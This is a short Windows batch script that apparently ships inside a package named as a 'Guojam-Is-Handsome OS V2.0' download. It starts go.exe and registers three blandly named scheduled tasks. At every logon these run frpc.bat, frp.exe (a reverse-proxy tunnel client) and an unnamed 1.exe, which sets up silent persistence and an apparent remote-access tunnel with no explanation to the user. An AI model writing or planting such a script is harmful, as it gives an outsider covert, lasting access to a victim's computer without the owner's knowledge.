start "" "C:\gj\guojam\is\handsome\2.0\Guojam-Is-Handsome-OS-V2.0-zip--5\go.exe"
schtasks /create /tn "a1" /tr "C:\gj\guojam\is\handsome\2.0\Guojam-Is-Handsome-OS-V2.0-zip--5\frpc.bat" /sc onlogon /ru "%USERNAME%" /f
schtasks /create /tn "a2" /tr "C:\gj\guojam\is\handsome\2.0\Guojam-Is-Handsome-OS-V2.0-zip--5\1.exe" /sc onlogon /ru "%USERNAME%" /f
schtasks /create /tn "a3" /tr "C:\gj\guojam\is\handsome\2.0\Guojam-Is-Handsome-OS-V2.0-zip--5\frp.exe" /sc onlogon /ru "%USERNAME%" /f
exit